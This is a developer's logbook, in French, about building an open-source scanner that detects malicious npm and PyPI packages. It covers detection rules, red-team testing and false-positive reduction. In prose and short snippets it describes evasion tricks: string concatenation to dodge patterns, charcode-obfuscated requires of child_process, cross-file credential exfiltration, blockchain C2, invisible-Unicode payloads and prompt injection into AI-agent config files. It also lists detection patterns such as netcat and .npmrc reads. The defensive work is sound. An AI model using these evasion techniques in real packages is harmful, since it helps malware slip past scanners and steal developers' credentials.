# Carnet de Bord - Projet MUAD'DIB

**Scanner de securite npm & PyPI contre les attaques supply-chain**

DNSZLSK
Formation CDA - AFPA
Janvier - Mars 2026

---

## D'ou vient ce projet ?

Novembre 2025. Je scrolle Reddit, section r/netsec. Un post attire mon attention : **"Shai-Hulud 2.0 : un ver npm a compromis 796 packages"**.

Je clique. Et la, je decouvre l'ampleur du truc.

Ce ver, baptise Shai-Hulud comme les vers geants de Dune, s'est propage automatiquement via les dependances npm. Il volait les tokens GitHub, npm, AWS, et les exfiltrait vers des repos publics marques "Sha1-Hulud: The Second Coming". Plus de 25 000 depots GitHub touches. Des boites comme Zapier, PostHog, Postman temporairement compromises.

Je me suis dit : "Et si je creais un outil pour detecter ca ?"

Pas pour concurrencer les gros. Socket, Snyk, ils ont des millions de funding et des equipes de 50 personnes. Juste pour avoir quelque chose de gratuit, open source, que n'importe quel dev peut installer en une commande.

Le nom s'est impose naturellement : **MUAD'DIB**, le nom Fremen de Paul Atreides dans Dune, celui qui combat les vers geants.

---

## Premiere semaine : la base

### L'erreur du debutant

Mon premier reflexe a ete de vouloir faire du machine learning. Entrainer un modele pour detecter les patterns malveillants. Claude m'a recadre direct :

> "Oublie l'IA pour la v1. Concentre-toi sur l'analyse AST des comportements et l'integration des IOCs existants. C'est moins sexy mais c'est ce qui protege reellement."

Il avait raison. Les attaquants de Shai-Hulud utilisent des patterns connus. Pas besoin de reinventer la roue.

### Ce que j'ai construit

Trois piliers :

**1. Matching IOC** : Une base de 225 000+ packages malveillants connus. Si ton projet en utilise un, alerte immediate.

**2. Analyse AST** : Je parse le JavaScript avec acorn pour detecter les patterns suspects : `eval()`, `child_process`, lecture de `.npmrc`, etc.

**3. Detection typosquatting** : Distance de Levenshtein pour reperer les noms similaires aux packages populaires (`lodahs` vs `lodash`).

---

## Les galeres

### 126 alertes sur React.js

Premier test sur le repo officiel de React. Resultat : **126 alertes**. Score de risque : 89/100.

Evidemment, React n'est pas un malware. Mon scanner detectait des trucs legitimes comme des faux positifs.

Exemples de ce qui declenchait des alertes :

| Package | Detection | Realite |
|---------|-----------|---------|
| esbuild | child_process.spawn() | Bundler natif legitime |
| sharp | postinstall script | Compilation binaire necessaire |
| qs | IOC GitHub Advisory | CVE (vulnerabilite), pas malware |

J'ai passe trois jours a affiner les whitelists. Resultat final sur React : **1 alerte legitime** (un script postinstall de build). Score : 3/100.

### Le scraper qui casse

J'ai voulu automatiser la collecte d'IOCs depuis plusieurs sources : Datadog, Socket, Phylum, OSV, GitHub Advisory. Sauf que GitHub Advisory inclut des CVE (vulnerabilites), pas du malware.

Resultat : 54 faux positifs d'un coup. Le package `qs` (utilise par Express) etait flague comme malveillant alors qu'il avait juste une CVE corrigee depuis longtemps.

J'ai du retirer GitHub Advisory du scraper. MUAD'DIB est un scanner **anti-malware**, pas un scanner de vulnerabilites. Pour les CVE, il y a `npm audit` ou Snyk.

### Le sandbox Docker (analyse dynamique)

Apres l'analyse statique, j'ai voulu aller plus loin : executer le code suspect dans un environnement isole pour voir ce qu'il fait vraiment.

Le principe est simple :
1. Creer un container Docker ephemere
2. Installer le package dedans avec `npm install`
3. Capturer les comportements avec `strace` et `tcpdump`
4. Analyser : connexions reseau, acces fichiers sensibles, process suspects

Premier test sur `lodash` : aucun comportement suspect. Normal, c'est clean.

Le piege ? Les faux positifs. Mon premier scanner detectait "nc" (netcat) dans le nom de fichier `graceful-fs/clone.js`. J'ai du affiner la detection pour chercher `/nc ` ou `netcat` en commande, pas en substring.

Le sandbox ne remplace pas Socket ou Aikido qui font ca a grande echelle avec du ML. Mais pour un dev qui veut verifier un package inconnu avant de l'installer, c'est deja ca.

---

## Ce que j'ai appris

### Techniquement

**Analyse AST avec acorn** : Parser du JavaScript pour comprendre son comportement, pas juste chercher des strings. Un `eval()` dans un fichier de config n'a pas la meme signification qu'un `eval()` dans un postinstall.

**Distance de Levenshtein** : L'algorithme classique pour mesurer la similarite entre deux chaines. Parfait pour detecter `axois` qui essaie de se faire passer pour `axios`.

**MITRE ATT&CK** : Le framework de reference pour classifier les techniques d'attaque. Chaque detection de MUAD'DIB est mappee sur une technique (T1195.002 pour supply chain, T1552.001 pour vol de credentials, etc.).

**SARIF** : Le format standard pour les resultats de scanners de securite. Permet l'integration native dans GitHub Security.

**Docker et sandboxing** : Creer des containers ephemeres pour analyser du code suspect. Utiliser `strace` pour tracer les appels systeme, `tcpdump` pour capturer le reseau.

**Publication npm et VS Code Marketplace** : Tout le workflow : versioning, 2FA, tokens, metadonnees.

### Humainement

Ce projet m'a fait realiser qu'un dev solo peut avoir un impact reel en securite. Les outils commerciaux coutent cher. Socket c'est gratuit pour l'open source, mais les features avancees sont payantes. MUAD'DIB ne les remplacera jamais, mais il offre une premiere ligne de defense gratuite.

J'ai aussi appris a etre honnete sur les limites d'un projet. MUAD'DIB detecte les menaces *connues*. Pour les zero-day, il faut des outils qui font de l'analyse dynamique avancee, du ML, des trucs qui demandent des ressources que je n'ai pas.

---

## Audit et optimisations (Janvier 2026)

Apres la v1.2.5, j'ai demande a Claude Code de faire un audit complet. Le constat etait sans appel : techniquement solide mais pas "production-ready". Pas de visibilite (pas de badges GitHub), aucune feature differenciante, pas de metriques de coverage.

J'ai commence par les fondations : **parallelisation des scanners** avec `Promise.all()`, remplacement des tableaux par des `Map`/`Set` pour les lookups IOC (O(n) vers O(1)), cache SHA256, protection symlinks, fix XSS dans les rapports HTML.

La feature dont je suis le plus fier de cette periode : **`muaddib diff`**. Compare les menaces entre la version actuelle et un commit precedent, et affiche uniquement les NOUVELLES menaces. En vrai, les projets ont de la dette technique de securite. Avec `muaddib diff`, tu peux bloquer un PR uniquement s'il introduit de nouveaux problemes.

J'ai aussi ajoute le support pre-commit (pre-commit framework, husky, git natif) et publie la GitHub Action sur le Marketplace.

---

## Hardening et tests (Fevrier 2026)

Deux passes d'audit securite sur les 27 fichiers source ont revele 58 issues. Les plus graves : YAML unsafe loading (tags `!!js/function` executables), SSRF dans le fetcher IOC (redirects non validees), 18 regles manquantes dans `rules/index.js`. Coverage montee de 52% a 80%.

En parallele, j'ai cree une suite de **56 fuzz tests** pour verifier que les parsers ne crashent jamais (YAML invalide, billion laughs, JSON avec 10 000 cles, AST avec 100 niveaux de callbacks, CLI avec injection `$(...)`) et **15 scenarios adversariaux** simulant des packages malveillants realistes. 15/15 detectes.

---

## Support Python/PyPI (Fevrier 2026)

Apres npm, j'ai etendu MUAD'DIB pour scanner les projets Python. Le scanner parse `requirements.txt` (y compris les `-r` recursifs), `setup.py` et `pyproject.toml` (PEP 621 et Poetry). La base IOC integre le dump OSV PyPI avec ~14 000 packages malveillants (MAL-*).

Le vrai defi technique etait la distribution. Le fichier `iocs.json` complet faisait 112 MB apres scraping de toutes les sources. Impossible a distribuer via npm (limite 10 MB). J'ai cree un format compact (`iocs-compact.json`, ~5 MB) ou 87% des packages sont stockes comme wildcards (toutes versions malveillantes) et les 13% restants comme entrees versionnees. Au chargement, tout est converti en `Map`/`Set` pour des lookups instantanes.

---

## Le moniteur zero-day (13 Fevrier 2026)

MUAD'DIB savait scanner des projets existants, mais pas surveiller les nouveaux packages en temps reel. Les attaques supply-chain se propagent en heures. Le temps de faire un `muaddib scan` manuellement, c'est deja trop tard.

J'ai construit un moniteur continu qui interroge les registres npm et PyPI, telecharge et scanne chaque nouveau package, et envoie des alertes Discord en temps reel. Les galeres techniques ont ete nombreuses : l'endpoint npm deprecie (migration vers le flux RSS), les crashs PyPI ECONNREFUSED (l'URL du tarball etait `null`), le webhook Discord qui retournait 400 parce que les champs du summary ne correspondaient pas.

Sur une journee, le moniteur scanne ~2000-3000 packages. Les alertes arrivent avec suffisamment de contexte pour prendre une decision rapide.

---

## v2.0 - Le changement de paradigme (13 Fevrier 2026)

MUAD'DIB v1 etait 100% reactif. Si une attaque n'etait pas dans la base IOC, elle passait a travers. Les attaques comme ua-parser-js (2021) ou event-stream (2018) ont ete detectees des heures ou des jours apres la compromission. Pendant ce temps, des milliers de devs avaient deja installe les versions malveillantes.

En etudiant comment Socket.dev et Phylum detectent les 0-days, j'ai identifie un pattern commun : **l'analyse comportementale entre versions**. Au lieu de chercher si un package est dans une liste noire, on compare ce qui a change entre la version N et la version N-1.

J'ai implemente 5 features :
1. **Lifecycle soudain** : un package qui n'avait jamais de `postinstall` en ajoute un soudainement
2. **Diff AST temporel** : APIs dangereuses nouvellement ajoutees (child_process, eval, fetch)
3. **Anomalie de publication** : rafales de versions en 24h, package dormant avec une release soudaine
4. **Changement de maintainer** : le pattern event-stream (seul maintainer remplace)
5. **Canary tokens** : de faux credentials injectes dans le sandbox pour pieger les malwares qui les exfiltrent

En parallele, j'ai refactore les tests d'un seul fichier de 4000 lignes en 16 fichiers modulaires. Passage de 370 a 541 tests.

---

## Le Red Team (Fevrier - Mars 2026)

C'est le chapitre le plus humiliant et le plus formateur de tout le projet.

Le principe : creer des packages malveillants evasifs avec les regles gelees, mesurer combien passent a travers, puis corriger les angles morts. Le score pre-tuning (avant correction) est la metrique la plus honnete : elle mesure la capacite de generalisation.

**Vague 1 (20 samples)** : Baseline catastrophique. TPR 0%, ADR 14%. Le scanner ne detectait quasiment rien. Corrections massives du scanner AST, du dataflow, du package scanner. 5 nouvelles regles. Resultat post-fix : 20/20.

**Vague 2 (5 samples)** : Template literal obfuscation, proxy env intercept, websocket exfil. Score pre-tuning : 0%. Les techniques etaient completement hors radar.

**Vague 3 (5 samples)** : Techniques reelles 2025-2026. AI agent weaponization (pattern s1ngularity), injection de prompts dans .cursorrules, zero-deps dropper (pattern PhantomRaven), exfiltration via webhook Discord, preinstall avec fork detache. Score pre-tuning : 60%. J'ai du creer un 13eme scanner dedie a la detection d'injection dans les fichiers de configuration d'agents IA.

Puis les holdouts, qui revelent la vraie capacite de generalisation :

| Batch | Pre-tuning | Tendance |
|-------|------------|----------|
| Holdout v1 | 30% (3/10) | Angles morts massifs |
| Holdout v2 | 40% (4/10) | Amelioration marginale |
| Holdout v3 | 60% (6/10) | Amelioration significative |
| Holdout v4 | 80% (8/10) | La desobfuscation generalise |
| Holdout v5 | 50% (5/10) | Nouveau scanner inter-module |

Le 30% du holdout v1 a ete une gifle. Chaque vague revele des techniques que les regles existantes ne couvrent pas. Mais la tendance 30% → 40% → 60% → 80% montre que chaque correction ameliore la generalisation au-dela des patterns specifiques corriges.

La derniere campagne (Vague 4, mars 2026) a ete la pire : 0/5. Des techniques d'evasion simples mais efficaces. `.gi` + `t` contourne tout pattern matching sur `.git`. Un `new Function()` qui ne settait pas le flag `hasDynamicExec`. Des chemins construits via retour de fonction au lieu de variables. La concatenation de strings est une technique d'evasion redoutablement simple, et elle a ete documentee dans des campagnes reelles (SANDWORM_MODE).

Au total : 107 samples adversariaux (67 crees + 40 holdouts), ADR 96.3% (103/107). Les 4 misses sont documentes et acceptes.

---

## Voir a travers l'obfuscation (20 Fevrier 2026)

MUAD'DIB detectait les patterns d'obfuscation (variables `_0x`, hex escapes, base64) mais ne pouvait pas **voir a travers**. Un `require('child' + '_process')` etait detecte comme concatenation suspecte, mais un `require(String.fromCharCode(99,104,105,108,100,95,112,114,111,99,101,115,115))` passait completement inapercu.

J'ai cree un moteur de desobfuscation statique (`src/scanner/deobfuscate.js`) qui transforme le code obfusque en code lisible sans jamais l'executer. 4 transformations : string concat folding, charcode reconstruction, base64 decode, hex array resolution, plus une propagation de constantes qui les enchaine.

La lecon la plus importante : mon premier reflexe a ete de remplacer le code original par le code desobfusque avant le scan. **Mauvaise idee.** Le sample `dynamic-require` est passe de score 78 a 28 parce que les signaux d'obfuscation eux-memes (qui sont suspects) etaient perdus. La bonne approche est **additive** : scanner l'original d'abord, puis le desobfusque, et ajouter uniquement les nouvelles findings.

L'impact mesure sur le holdout v4 etait spectaculaire. `hex-array-exec` : totalement invisible sans desobfuscation (score 0 → 25). `mixed-obfuscation-stealer` : les couches d'obfuscation masquaient les patterns dangereux (score 10 → 45).

---

## Le dataflow inter-module (20 Fevrier 2026)

Les attaquants le savent : il suffit de separer la lecture des credentials dans `reader.js` et l'exfiltration dans `sender.js` pour echapper a un scanner qui ne regarde qu'un fichier a la fois.

J'ai cree `src/scanner/module-graph.js` qui construit un graphe de dependances entre les modules d'un package et propage les teintes a travers les frontieres de fichiers. L'analyse supporte les re-exports (3 hops max), les methodes de classe, les named exports, et meme les instances importees.

Deux limitations acceptees et documentees : les EventEmitters (pub/sub entre modules) et les callbacks (propagation de teinte a travers les fonctions anonymes). Ces deux cas necessitent une analyse dynamique ou symbolique qui depasse le scope de l'analyse statique. Mais ils n'affectent pas les patterns inter-modules les plus courants dans les malwares supply-chain.

Plus tard (v2.6.0-v2.6.1), j'ai aussi ajoute un **graphe d'intention** pour la coherence source-sink intra-fichier, et etendu le module-graph pour supporter les instances de classe (`this.X`), les pipelines stream, et les EventEmitters. Une decision architecturale importante : la co-occurrence cross-file sans preuve de data flow a ete volontairement exclue apres des tests sur 529 packages benins qui ont montre une explosion de faux positifs.

---

## Le jour ou j'ai decouvert le vrai FPR (20 Fevrier 2026)

C'est le moment le plus embarrassant du projet.

En examinant le code de `evaluateBenign()`, j'ai realise que le **FPR de 0%** etait completement faux. La fonction creait des repertoires temporaires vides contenant uniquement un `package.json` avec le nom du package. Les 13 scanners n'avaient litteralement rien a analyser. Le 0% ne mesurait que le matching IOC et la detection de typosquatting sur les noms, pas la capacite du scanner a eviter les faux positifs sur du vrai code source.

J'ai reecrit `evaluateBenign()` pour telecharger et scanner les vrais tarballs npm (529 packages). Premier resultat : **38% de faux positifs** (19/50 sur les premiers packages). Next.js a 76 `dynamic_require`, Restify a 52 `prototype_hook`, Gatsby a du hot-reload avec `require.cache`. Ce sont tous des patterns qui se superposent avec les techniques malware.

**Ne jamais faire confiance a un FPR de 0%.** Un scanner qui ne genere aucun faux positif ne scanne probablement rien.

Ce qui a suivi a ete un marathon de reduction du FPR. L'observation cle : les packages legitimes produisent des volumes massifs de certains types de menaces (Next.js a 76 dynamic requires), alors que les malwares n'en ont que 1 a 3. Un malware est furtif. Un framework est bruyant.

J'ai implemente des seuils de volume : si un package a plus de 10 `dynamic_require`, tous passent LOW. Si plus de 5 `dangerous_call_function`, tous passent LOW. Des whitelists pour les env vars de configuration (`npm_config_*`, `NODE_ENV`), les fichiers dans `dist/` traites comme du code bundle, un cap sur les `prototype_hook` MEDIUM.

Chaque correction ciblait un type specifique avec un seuil conservatif. Chaque correction etait verifiee sur les 40 holdouts adversariaux (zero regression). Le FPR est descendu : 38% → 19.4% → 17.5% → ~13%.

Le levier le plus puissant a ete le **scoring per-file max** : au lieu d'additionner les findings de tous les fichiers, le score est le maximum d'un fichier individuel plus les menaces package-level. Un framework avec 500 fichiers .js ne depasse plus le seuil juste parce que chaque fichier a un petit finding. Resultat : FPR de 13% → ~7%.

Apres les audits de securite qui ont resserre les heuristiques (FPR remonte a ~13.6%), puis les passes P5/P6 de precision : FPR curated ~10.8%, FPR random 7.5%. C'est honnete. Les FP restants sont des cas ambigus (fetch + eval dans un template engine, compilateurs monolithiques minifies) qui ne peuvent pas etre resolus par des heuristiques.

---

## Ground truth : de 4 a 49 samples (Fevrier 2026)

Au debut, le ground truth etait de 4 attaques reelles (event-stream, ua-parser-js, coa, node-ipc). TPR 100%. Facile.

J'ai elargi a 51 echantillons d'attaques reelles (49 actifs) couvrant 2018-2025 : eslint-scope, flatmap-stream, solana-web3js, rc, getcookies, ledgerhq-connect-kit, shai-hulud, et 39 autres. 3 nouvelles regles de detection ont ete necessaires : `crypto_decipher` (pattern flatmap-stream), `module_compile` (execution de code en memoire), et les proprietes `.secretKey`/`.privateKey` (pattern solana-web3js).

Le TPR est passe de 100% a 93.9% (46/49). Pas par regression, mais par expansion : les 3 misses sont hors scope (attaques browser-only comme lottie-player, polyfill-io, trojanized-jquery). Avec 49 samples, 93.9% est un chiffre beaucoup plus representatif que le 100% sur 4 samples.

En parallele, le coverage a ete pousse de 72% a 86% avec une expansion massive de la suite de tests (862 → 1317 tests). Les 40 holdouts ont ete fusionnes dans l'evaluation ADR : 75/75, puis 78/78 avec 3 samples supplementaires.

---

## Les audits de securite (Mars 2026)

Le projet a subi plusieurs vagues d'audit tout au long de son developpement. En tout, plus de 140 issues corrigees : injections de commande, SSRF, prototype pollution, YAML unsafe, race conditions HMAC, ReDoS dans les regex, fuites de spinner, ecritures non-atomiques.

Le plus gros audit (v2.5.0-v2.5.6) a traite 41 issues en 5 releases. Chaque vague de correction etait conservative : on corrige, on teste, on verifie zero regression, on continue.

L'audit post-sécurité (v2.6.5-v2.6.9) a ete particulierement structurant. Parmi les changements : suppression de la self-dependency (MUAD'DIB ne se scanne plus lui-meme), garde anti-recursion dans le dataflow (MAX_TAINT_DEPTH=50), seuil ADR global unique (suppression des seuils par echantillon), et mode paranoid avec tracking des alias eval/Function/require.

Un dernier audit (v2.10.1) a identifie 6 bypasses exploitables. Session intensive de 24h : WebSocket/MQTT comme sinks, entropie fragmentee, destructuring + chaine de prototypes, dilution `dynamic_require`, bruit `env_access`, correlation lifecycle-file. Tous fermes, zero regression.

Le trade-off constant : les heuristiques plus strictes ameliorent la detection mais augmentent le FPR. Le FPR est remonte de 6% a ~13.6% apres les hardening v2.5.13-v2.5.14, puis redescendu a ~10.8% apres les passes de precision P5/P6.

---

## Le moniteur en production (Mars 2026)

Le moniteur a evolue significativement entre la v1 et la v2.8.

Le changement le plus important : le remplacement du polling RSS par le **changes stream CouchDB** de npm. L'ancien moniteur interrogeait le RSS toutes les 60 secondes avec un delai de 1-2 minutes et des publications manquees si plus de 50 packages etaient publies dans la fenetre. Le changes stream est un flux continu en temps reel, sans omission.

Les galeres : HTTP 400 au demarrage (le `since` initial doit etre le `update_seq`, pas "now"), reconnection avec backoff exponentiel, scan parallele (concurrency=3).

Reduction du bruit webhook en 4 chantiers : self-exclude (ne pas scanner `muaddib-scanner` lui-meme), scope grouping (un monorepo qui publie 20 packages en rafale genere une seule alerte), WASM standalone (WebAssembly sans reseau n'est pas suspect), reputation scoring (facteur base sur l'age, les versions, et les telechargements).

Le sandbox a aussi evolue : simulation de 6 environnements CI (certains malwares ne s'activent que si `CI=true`), canary tokens enrichis (6 honeypots), et surtout le **monkey-patching preload**. Le preload intercepte `Date.now()`, `setTimeout`, et toutes les APIs sensibles. Si un malware attend 72h avant de voler les credentials, on lui fait croire que 72h se sont ecoulees. Multi-run a 0h, 72h, et 7 jours.

---

## GlassWorm et la blockchain C2 (18 Mars 2026)

Mars 2026 : decouverte de la campagne GlassWorm. 433+ packages npm compromis utilisant deux techniques inedites.

La premiere : des **caracteres Unicode invisibles**. Le code malveillant est cache dans des caracteres zero-width (U+200B, U+200C, U+200D), des BOM hors position 0, des variation selectors. Le fichier semble vide a l'oeil nu mais contient du code executable.

La deuxieme : du **C2 via blockchain Solana**. Au lieu d'un serveur C2 classique (facile a takedown), les attaquants stockent les commandes dans des transactions Solana. Le malware lit les instructions via `getSignaturesForAddress`. Le serveur C2 est la blockchain elle-meme, immuable et impossible a saisir.

J'ai ajoute la detection Unicode invisible dans le scanner d'obfuscation (seuil >= 3 caracteres invisibles), la detection blockchain C2 dans le scanner AST (import Solana + methodes C2), et les endpoints RPC hardcodes (Solana, Infura, Ankr). 6 IPs C2 GlassWorm ajoutees aux domaines suspects, 8 packages compromis ajoutes aux IOC builtin.

Le moniteur a aussi ete renforce a ce moment : IOC pre-check avant tout download (webhook PRE-ALERT immediat), extraction du tarball URL directement depuis le doc CouchDB (plus de 404 quand npm supprime le package), et cache local des tarballs pour les packages a haute priorite.

---

## Quand les malwares se mettent a deux (19 Mars 2026)

Un truc que les manuels de securite ne disent pas : les techniques malveillantes, prises individuellement, existent souvent dans du code legitime. Un `child_process.exec()` dans un lifecycle script ? Ca peut etre webpack comme du malware. Un `env_access` + `fetch` ? Express le fait tous les jours.

Mais certaines *combinaisons* n'apparaissent jamais dans les packages legitimes. En passant au peigne fin les co-occurrences de types de menaces dans les 529 packages benins, j'ai trouve 6 paires a faux positif zero. Exemple : un package typosquat qui a aussi un lifecycle script ? Sur 529 packages legit, ca n'arrive pas. Dans les malwares, c'est quasiment la signature. Pareil pour un payload chiffre avec un `crypto_decipher` : un bundler ne fait pas ca.

Le compound scoring injecte des findings CRITICAL quand ces paires co-existent. Le piege a eviter : les appliquer avant les reductions FP, parce que les reductions annuleraient le boost. Ca parait evident apres coup, mais j'ai perdu une demi-journee dessus.

---

## Le mur des zero confirmes (22 Mars 2026)

Apres 3 mois de monitoring 24/7 — environ 10 000 packages par jour — j'ai fini par regarder les chiffres en face : **zero malware confirme**. Le moniteur crachait ~600 alertes quotidiennes mais aucune n'avait ete verifiee comme un vrai positif.

En creusant, j'ai decouvert la pire erreur du projet. Quand le sandbox ne trouvait rien, le moniteur marquait automatiquement le package comme "faux positif". Sauf que le sandbox n'avait pas de honey tokens pendant 3 mois. Un sandbox propre ne prouve rien — le malware peut simplement ne pas s'etre active. 8176 records contamines. J'ai pollue mes propres donnees d'entrainement pendant 3 mois sans m'en rendre compte.

Le nettoyage a ete une lecon d'humilite. Le classifier ML avant nettoyage : precision 37%, recall 99.8% — il "detectait" tout mais la moitie etait du bruit. Apres nettoyage (les 8176 "fp" reclasses en "unconfirmed", exclus de l'entrainement) : precision 97.8%, recall 93.3%. Le meme code, les memes features, des donnees propres. C'est la preuve que le ML n'est jamais meilleur que ses labels.

J'ai entraine deux modeles : un XGBoost pour la detection malware (114 arbres, 21 features) et un detecteur de bundlers specialise dans les faux positifs de webpack et rollup qui scorent haut. Le deuxieme modele a un F1 de 0.996 mais avec un warning de data leakage sur la taille des packages — les bundlers sont gros par nature, donc le modele triche un peu.

Le plus gros chantier a ete le triage des alertes. J'ai mis en place un systeme de priorites : P1 rouge pour les IOC matches et les detections sandbox, P2 orange pour les scores eleves avec compounds, P3 jaune pour le reste. L'idee c'est que les ~26 vrais malwares par jour soient visuellement distincts dans le flux Discord. Ca ne remplace pas un vrai triage automatise, mais ca rend le mur d'alertes a peu pres lisible.

J'ai aussi investigate manuellement 9 packages en live. Tous des FP. Confirmation definitive que le triage humain ne scale pas.

En comparant avec l'industrie — Socket avec $65M de funding, Phylum rachete par Veracode, Snyk, Semgrep — MUAD'DIB est le seul outil francais dans ce domaine. Un stagiaire en formation qui joue dans la meme cour que des boites avec des dizaines d'ingenieurs. Ca met en perspective.

---

## La course contre les campagnes (22-27 Mars 2026)

16 versions en 5 jours. Le moniteur en production exposait des vrais problemes, et les campagnes d'attaque n'attendent pas.

**CanisterWorm** a ete le plus impressionnant. Premier worm npm auto-replicant documente — il se propage de package en package en volant les tokens npm des mainteneurs. Le truc terrifiant : TeamPCP avait compromis Trivy v0.69.4, un outil de securite. L'outil cense proteger etait lui-meme piege. J'ai ajoute 5 regles : persistance systemd, vol de tokens pour la propagation, wipe filesystem (un script kamikaze qui ciblait l'Iran), et scan de `/proc/*/mem` pour voler les secrets CI/CD.

**LiteLLM** m'a fait decouvrir un vecteur que je ne connaissais pas : les fichiers `.pth` Python s'executent automatiquement au demarrage de l'interpreteur. Tu drops un fichier dans `site-packages/` et Python l'execute a chaque import. Discret et redoutable.

En parallele, le moniteur ramait. Certains scans depassaient 30 secondes, ce qui creait un backlog grandissant. J'ai passe 3 jours a optimiser : worker threads pour les scanners CPU-bound, exclusion automatique des `dist/`, caches AST et contenu, timeout statique a 45s, size cap a 10 MB, et un limiteur HTTP centralise a 10 requetes concurrentes pour eviter les OOM. De la plomberie ingrate mais necessaire pour que le 24/7 tienne la route.

Le FPR a aussi baisse de 11.0% a 10.6% grace a quelques ajustements de graduation — un `suspicious_dataflow` qui vient d'une variable d'environnement de telemetrie n'a pas la meme gravite qu'un vrai credential harvest.

Un effet de bord inattendu : l'ADR est passe de 96.3% a 94.0%. Pas une regression — j'avais deplace les samples adversariaux vers un repo prive pour eviter qu'ils servent de recette aux attaquants, et certains ne sont plus sur disque.

---

## L'auto-labeler, ou comment j'ai failli entrainer un modele sur du vent (Avril 2026)

Le probleme de fond : 49 malwares confirmes dans le ground truth, c'est ridicule pour entrainer un modele serieux. Le pipeline ML tournait en cercle — il labellisait ses propres predictions comme verite terrain. Comme un etudiant qui corrige ses propres copies.

J'ai construit un auto-labeler qui croise 3 sources externes independantes : OSSF malicious-packages (227K entrees), GitHub Advisory Database (5300 advisories npm), et le statut npm registry (un package supprime dans les 72h apres publication, c'est un takedown). Si au moins deux sources convergent, le label est "confirmed_malicious". Resultat : 377 confirmed au lieu de 49. Un ground truth 7x plus large.

Premier entrainement avec les nouvelles donnees : precision 1.000, recall 1.000. Trop beau. J'ai immediatement su que quelque chose clochait. En creusant : 16 features absentes du corpus Datadog etaient mises a -1. Le modele ne detectait pas les malwares — il detectait *quelle source* avait fourni les donnees. Data leakage classique, et j'ai failli le deployer en prod sans verifier.

Apres correction (features manquantes a 0, filtre automatique des features "leaky"), le modele honnete donne un FPR de 2.85% au lieu de 11%, mais une precision de 0.924 au lieu de 0.999. En prod, ca veut dire 239 faux positifs au lieu de 924 sur le meme set. Mon inbox Discord me remercie.

Autre surprise : sur les 377 malwares confirmes, seulement 15 matchaient dans le dataset d'entrainement. Les 362 autres n'avaient jamais ete scannes par le moniteur au moment de leur publication. Il a fallu extraire les features depuis les alertes archivees, porter l'extracteur JS en Python. 357 restent sans donnees — pas d'alerte, pas de scan, rien. Le modele ne peut apprendre que de ce qu'il a vu. Le meilleur auto-labeler du monde ne remplace pas un pipeline de collecte exhaustif.

---

## L'audit forensique, le cluster FP, et un merge qui a failli tout casser (11 Avril 2026)

Le moniteur en 24/7 sur npm crachait entre 500 et 900 alertes par jour. J'en recevais une fraction sur Discord grace a la reduction de bruit webhook (v2.7.5), mais j'avais l'impression de regarder un firehose. Les quelques que je prenais le temps d'ouvrir ressemblaient a des faux positifs sur des bundles minifies — `babylonjs`, `electron`, `@testim/testim-cli`, des trucs que personne de sense ne classerait comme malveillant.

Le probleme : j'avais aucune idee de combien de mes alertes etaient vraiment des FPs versus des vrais malwares que je manquais faute de revue. Apres 3 mois, le moniteur avait accumule **53 953 alertes** dans `logs/alerts/`. Je ne pouvais pas les lire une par une.

J'ai decide de lancer un audit forensique massif sur le VPS avec l'aide de Claude Code, en mode analyste malware. Pas un data engineer qui croise des APIs externes — un analyste qui lit le code reel de chaque package pour dire ce que le code fait vraiment. Extraire le tarball, ouvrir les scripts lifecycle, tracer le flux de credentials, classer le comportement observable.

Sur les 8 396 packages avec un score ≥ 50, j'ai tire un echantillon stratifie de 180 packages (30 par bande de score), le VPS a fait une passe de deep-review, puis une passe 2 sur les 43 cas ou un flag "angle mort" s'est declenche (le scanner tirait HIGH/CRITICAL sur des fichiers hors lifecycle). Total : 78 packages lus en profondeur.

Le verdict : **~71-79% des high-score alerts sont des FPs structurels** concentres dans 4 clusters precis.

**Cluster 1 : les bundles minifies legitimes.** Les rules AST/dataflow/obfuscation tiraient sur des helpers bundler standards — `__webpack_require__`, `Function("return this")()`, `var __copyProps = (to, from, except, desc) => ...`, des chaines de `.replace()`. 14 packages impactes : babylonjs, electron, @kitware/vtk.js, dprint, @jetbrains/junie, @zuplo/core, @stencil/core, playwright, @equinor/echo-*, @alipay/ams-checkout, @testim/testim-cli, @vanwei-wcs/video-player-v2, @bookolosystem/engine, @epie/bi-crud. Le probleme : le `DIST_FILE_RE` etait trop etroit. Il ne matchait pas `.umd.js`, `.esm.js`, `.es.js`, `.common.js`, `.max.js`, les chunks avec hash-suffix (`assets/index-a1b2c3d4.js`), les dossiers `fesm*/`, `browser/`, `chunks/`, `_app/`. Toute une cartographie du monde JS moderne qui etait invisible au scoring.

**Cluster 2 : AST-006 `dynamic_require` plugin loaders.** 53 fires sur des packages qui font `config.plugins.forEach(name => require(name))` ou `require(path.join(__dirname, 'plugins', name))`. Pattern legitime. La distinction LOW/HIGH existante ne capturait pas la source reelle de la variable. J'ai ajoute un tracking de source par variable (`string_literal`, `array_literal`, `fs_readdir`, `require_json`, `env_var`) pour distinguer un plugin loader (LOW) d'une vraie obfuscation (HIGH) d'un vecteur d'exfil `require(process.env.X)` (CRITICAL). C'etait surtout une extension du systeme `ctx.staticAssignments` existant, pas une refonte.

**Cluster 3 : AST-007 quick-scan sur les overflow files.** 18+ fires sur `rsshub/dist-lib/*.mjs` — des RSS route handlers qui appellent `child_process.spawn(ffmpeg)` dans des fonctions runtime (pas au top-level install-time). Le quick-scan est un fallback regex quand le file count cap (500) est atteint. Par definition il n'a pas de scope tracking — il ne peut pas distinguer un `exec()` dans `module.exports.handler = () => {...}` d'un `exec()` au top-level. J'ai downgrade toutes les detections quick-scan a MEDIUM (au lieu de HIGH), avec une exception CRITICAL pour `Module._load` qui reste specifique au malware. Les threats "degraded" vont dans un bucket separe cape a 15 points dans le scoring, donc meme 30 fires quick-scan ne peuvent plus dominer un score.

**Cluster 4 : `@leoqlin/openclaw-qqbot` et les WASM bundles.** 52 fires ENTROPY-001 sur UN seul fichier : `node_modules/mpg123-decoder/src/EmscriptenWasm.js`. Le package shippait ses node_modules dans son tarball publie, et l'obfuscation scanner (qui n'exclut pas node_modules volontairement, pour detecter les deps compromises) tirait sur du WASM compile Emscripten qui est high-entropy par construction. Fix chirurgical : detecter les artefacts WASM/Emscripten par basename (`mpg123-decoder`, `wasm-audio-decoders`, etc.) OU par content markers (`Module["asm"]`, `WebAssembly.instantiate`, `HEAPU8`, `_emscripten_`, base64 magic `AGFzbQ`) et skipper juste le scanner d'obfuscation. Les autres scanners continuent a analyser ces fichiers — si un vrai malware se cache dedans, l'AST scanner ou le dataflow le verra.

